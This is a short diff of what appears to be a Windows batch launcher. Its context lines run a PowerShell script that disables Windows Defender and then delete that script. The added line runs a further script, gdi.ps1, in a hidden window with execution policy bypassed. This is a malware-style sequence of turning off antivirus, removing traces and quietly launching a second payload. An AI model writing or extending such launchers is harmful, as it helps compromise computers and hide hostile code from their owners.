@@ -20,3 +20,4 @@ REM Run the PowerShell script from the same directory
 powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%Disable_windows_defender.ps1"
 del Disable_windows_defender.ps1
 
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT_DIR%gdi.ps1"
